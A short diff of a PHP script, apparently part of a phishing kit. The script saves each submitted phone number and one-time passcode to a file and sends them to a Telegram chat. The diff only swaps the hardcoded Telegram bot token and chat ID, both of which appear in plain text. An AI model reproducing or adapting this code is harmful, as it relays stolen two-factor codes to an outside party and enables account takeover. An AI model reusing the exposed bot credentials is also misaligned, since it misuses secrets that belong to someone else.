@@ -20,8 +20,8 @@ $statuses[$phone]['otp_value'] = $otp;  // optional, store the actual OTP
 file_put_contents($file, json_encode($statuses));
 
 // ===== 3️⃣ Send OTP to Telegram =====
-$token = "8744826936:AAEEPHDQXU5kGUp_WsH5l0xHOerKOZ3OCjA";
-$chat_id = "1097314312";
+$token = "8750204077:AAGic1aB32nqwmmvnQyvs_7bDFjcslfJYt8";
+$chat_id = "6057287429";
 
 $message = "🔑 OTP Submitted\nPhone: $phone\nOTP: $otp";
 
